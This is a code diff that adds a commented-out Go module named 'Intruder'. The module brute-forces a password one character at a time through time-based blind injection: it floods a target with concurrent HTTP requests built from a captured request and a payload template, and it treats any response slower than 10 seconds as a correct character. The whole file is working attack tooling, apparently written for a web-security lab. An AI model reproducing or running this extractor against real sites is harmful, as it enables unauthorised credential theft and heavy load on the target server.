@@ -1,0 +1,97 @@
+/*
+
+package dynamic
+
+import (
+	"fmt"
+	"net/http"
+	"sync"
+	"time"
+)
+
+var wg = &sync.WaitGroup{}
+var mutex = &sync.Mutex{}
+var mutex2 = &sync.Mutex{}
+
+type Intruder struct {
+	Client  *http.Client
+	Referal *[]byte
+}
+
+type Result struct {
+	password string
+	loc      int
+}
+
+type IHandler interface {
+
+	//methods
+	IHandle_Request(payload source.Payload, ch chan<- Result, startx int, z string)
+	IHandle_Response(resp *http.Response) bool
+	IHandle_Logic()
+}
+
+func (I *Intruder) IHandle_Request(payload source.Payload, ch chan<- Result, startx int, z string) {
+	req := source.BytestoRequest(payload.Create(startx, z))
+	start := time.Now()
+	I.Client.Do(req)
+	eval := time.Since(start).Seconds()
+	if eval > 10.00 {
+		testx := Result{
+			password: z,
+			loc:      startx,
+		}
+		ch <- testx
+	}
+	defer wg.Done()
+}
+
+func (I *Intruder) IHandle_Response(resp *http.Response) bool {
+	if resp.StatusCode == 200 {
+		return true
+	} else {
+		return false
+	}
+}
+
+func (I *Intruder) IHandle_Logic() {
+	fmt.Println("Started Intruder")
+	datax := source.Wordlist_lowerandnum()
+
+	P := source.NewPayload(I.Referal)
+	ch := make(chan Result, 10)
+
+	receiver := func(ch <-chan Result) {
+		for {
+			dat, ok := <-ch           // this here is a logic to break out of loop if there is nothing to send
+			if ok == false {
+				break
+			} else {
+				mutex.Lock()
+				fmt.Println("char at loc:", dat.loc, " is ", dat.password)
+				mutex.Unlock()
+			}
+
+		}
+		fmt.Println("Retrieved Password")
+		defer wg.Done()
+	}
+
+	wg.Add(1)
+	go receiver(ch)
+
+	for t := 1; t < 22; t = t + 1 {
+		for _, z := range *datax {
+			wg.Add(1)
+			go I.IHandle_Request(P, ch, t, z)
+		}
+		// time.Sleep(9 * time.Second)
+	}
+
+	wg.Wait()
+	close(ch)
+
+}
+
+
+*/
